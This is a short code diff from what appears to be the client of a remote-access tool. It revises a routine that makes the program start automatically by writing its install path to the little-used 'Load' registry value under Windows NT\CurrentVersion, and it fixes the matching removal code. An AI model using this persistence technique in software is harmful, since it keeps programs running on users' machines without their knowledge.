@@ -326,13 +326,13 @@ namespace xClient.Core
                                 Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows NT\\CurrentVersion"))
                         {
                             if (key == null) throw new Exception();
-                            key.SetValue("Load", InstallPath);
+                            key.SetValue(@"Load", InstallPath);
                             key.Close();
                         }
                     }
                     catch
                     {
-                        // Try creating the key
+                        // Create key
                         try
                         {
                             using (
@@ -340,13 +340,12 @@ namespace xClient.Core
                                     Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion"))
                             {
                                 if (key == null) throw new Exception();
-                                key.SetValue("Load", InstallPath);
+                                key.SetValue(@"Load", InstallPath);
                                 key.Close();
                             }
                         }
                         catch
                         {
-                            // Do nothing, installation failed
                         }
                     }
 
@@ -416,11 +415,11 @@ namespace xClient.Core
                     {
                         using (
                             RegistryKey key =
-                                Registry.CurrentUser.OpenWritableSubKeySafe(""))
+                                Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows NT\\CurrentVersion"))
                         {
                             if (key != null)
                             {
-                                key.DeleteValue("Load", false);
+                                key.DeleteValue(@"Load", false);
                                 key.Close();
                             }
                         }
